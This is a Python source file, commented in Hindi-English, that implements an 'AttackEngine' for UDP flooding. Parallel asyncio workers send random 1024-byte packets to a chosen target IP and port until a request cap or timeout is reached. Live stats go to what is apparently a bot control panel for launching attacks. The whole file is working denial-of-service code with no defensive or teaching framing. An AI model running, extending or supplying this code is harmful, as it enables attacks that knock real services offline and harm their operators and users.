import asyncio
import random
import time
import logging
from dataclasses import dataclass

# Logging setup
logger = logging.getLogger("AttackEngine")

@dataclass
class AttackStats:
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    start_time: float = 0.0
    is_running: bool = False
    target: str = ""
    port: int = 0
    threads_active: int = 0
    max: int = 0

class AttackEngine:
    def __init__(self, max_requests: int, thread_count: int, timeout: int):
        self.max_requests = max_requests
        self.intensity = thread_count
        self.timeout = timeout
        self.stats = AttackStats()
        self.stats.max = max_requests
        self._stop_event = asyncio.Event()

    def get_status(self):
        """BotHandler panel ko live stats dene ke liye"""
        duration = time.time() - self.stats.start_time if self.stats.start_time else 0
        rps = self.stats.total_requests / duration if duration > 0.1 else 0
        
        return {
            'running': self.stats.is_running,
            'target': self.stats.target,
            'port': self.stats.port,
            'progress': self.stats.total_requests,
            'max': self.stats.max,
            'successful': self.stats.total_requests, # Async mein success count requests ke barabar hota hai
            'failed': self.stats.failed,
            'rps': round(rps, 2),
            'duration': round(duration, 1),
            'threads_active': self.stats.threads_active
        }

    def stop_attack(self):
        """Attack ko beech mein rokne ke liye"""
        self.stats.is_running = False
        self.stats.threads_active = 0
        self._stop_event.set()

    def start_attack(self, target_ip: str, target_port: int, method: str = "udp"):
        """BotHandler isko call karta hai. Ye background mein task shuru karta hai."""
        if self.stats.is_running:
            return False
            
        self.stats.is_running = True
        self.stats.target = target_ip
        self.stats.port = target_port
        self.stats.start_time = time.time()
        self.stats.total_requests = 0
        self.stats.threads_active = self.intensity
        self._stop_event.clear()

        # Attack ko background task bana kar chalao taaki bot busy na ho
        asyncio.create_task(self._run_all_tasks(target_ip, target_port))
        return True

    async def _run_all_tasks(self, ip, port):
        """Saare workers ko ek saath chalane wala coordinator"""
        tasks = []
        for _ in range(self.intensity):
            tasks.append(self._udp_worker(ip, port))
        
        try:
            # Gather se saare tasks parallel chalenge
            await asyncio.wait_for(asyncio.gather(*tasks), timeout=self.timeout)
        except Exception:
            pass
        finally:
            self.stop_attack()

    async def _udp_worker(self, ip, port):
        """Asal packet bhejane wala function"""
        loop = asyncio.get_running_loop()
        try:
            # Datagram endpoint high performance ke liye
            transport, _ = await loop.create_datagram_endpoint(
                lambda: asyncio.DatagramProtocol(),
                remote_addr=(ip, port)
            )
            payload = random._urandom(1024)
            
            while self.stats.is_running and self.stats.total_requests < self.max_requests:
                transport.sendto(payload)
                self.stats.total_requests += 1
                # Sleep(0) CPU ko doosre tasks (bot messages) handle karne ka mauqa deta hai
                await asyncio.sleep(0) 
                
            transport.close()
        except Exception as e:
            logger.debug(f"Worker error: {e}")
            self.stats.failed += 1
